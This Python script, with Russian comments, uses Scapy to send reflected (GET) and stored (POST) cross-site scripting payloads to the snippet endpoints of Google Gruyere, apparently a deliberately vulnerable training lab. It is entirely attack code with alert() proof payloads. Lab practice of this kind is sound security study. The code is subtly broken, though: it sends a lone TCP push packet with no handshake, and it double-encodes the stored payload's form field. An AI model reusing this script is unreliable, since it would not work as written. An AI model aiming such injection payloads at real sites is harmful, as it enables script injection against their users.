
from scapy.all import *
import urllib.parse

# Настройки цели 
GRUYERE_ID = "665078920510208521340948655182A59456348" 
TARGET_HOST = "google-gruyere.appspot.com"

def send_xss_reflected():
    """Отправка Reflected XSS через GET запрос."""
    payload = "<script>alert('XSS_Reflected_Scapy')</script>"
    encoded_payload = urllib.parse.quote(payload)
    
    # Формируем путь к уязвимому параметру 'snippet'
    path = f"/{GRUYERE_ID}/newsnippet?snippet={encoded_payload}"
    
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "User-Agent: Scapy-XSS-Lab\r\n"
        "Connection: close\r\n\r\n"
    )
    
    # Сборка пакета: IP / TCP / HTTP-строка
    pkt = IP(dst=TARGET_HOST) / TCP(dport=80, flags="PA") / Raw(load=request)
    
    print(f"[*] Отправка Reflected XSS на {TARGET_HOST}...")
    send(pkt)
    print("[+] Пакет отправлен. Проверьте страницу Gruyere.")

def send_xss_stored():
    """Отправка Stored XSS через POST запрос (создание нового сниппета)."""
    payload = "snippet=<img src=x onerror=alert('XSS_Stored_Scapy')>"
    encoded_payload = urllib.parse.quote(payload)
    
    path = f"/{GRUYERE_ID}/newsnippet2"
    body = f"snippet={encoded_payload}"
    
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
        f"{body}"
    )
    
    pkt = IP(dst=TARGET_HOST) / TCP(dport=80, flags="PA") / Raw(load=request)
    
    print(f"[*] Отправка Stored XSS (POST) на {TARGET_HOST}...")
    send(pkt)
    print("[+] Пакет отправлен. Проверьте главную страницу Gruyere.")

if __name__ == "__main__":
    print("Выберите тип атаки:")
    print("1. Reflected XSS (через GET)")
    print("2. Stored XSS (через POST)")
    
    choice = input("> ")
    if choice == "1":
        send_xss_reflected()
    elif choice == "2":
        send_xss_stored()
    else:
        print("Неверный выбор.")
